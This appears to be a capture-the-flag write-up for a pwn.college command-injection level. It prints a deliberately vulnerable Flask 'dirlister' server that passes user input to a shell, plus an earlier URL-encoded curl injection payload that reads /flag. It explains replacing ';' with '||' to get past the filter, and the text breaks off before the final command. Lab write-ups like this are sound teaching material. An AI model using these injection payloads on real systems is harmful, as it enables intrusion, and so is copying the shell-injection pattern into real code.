## Exercise
Many developers are aware of things like command injection, and try to prevent it. In this level, you may not use `;`! Can you think of another way to command-inject? Recall what you learned in the [Piping](https://pwn.college/linux-luminarium/chaining) module of the [Linux Luminarium](https://pwn.college/linux-luminarium)

## Solution
First things first, let's take a look at the permissions on this server:
```
> ls -l /
drwxr-xr-x    1 root root 4096 Aug 29 09:53 challenge
-r--------    1 root root   60 Aug 29 09:53 flag

> ls -l /challenge
-rwsr-xr-x 1 root root  290 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 1199 Sep  6  2025 server
```
Ok like the last time we got read and execute permissions for all challenge files and not direct access to the flag.
Let's read the server:
```
> cat /challenge/server
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/checkpoint", methods=["GET"])
def challenge():
    arg = flask.request.args.get("folder", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/checkpoint"><input type=text name=folder><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
This time the server listens for GET requests on /checkpoint, it takes arguments on "folder" and it replaces ; characters. Well we don't really need to change much to make this work. Our old command for the injection was:
```
curl -L -v "http://challenge.localhost:80/mission?topdir=%7D%3B%20cat%20%2Fflag%20%2D%2D%20"
```
We need to change the ; (%3B) with 2 || (%7C) characters. Why? Because || executes only the 2nd command if the first fails and we know that the first fails because ls -l {} is no valid command therefore let's try:
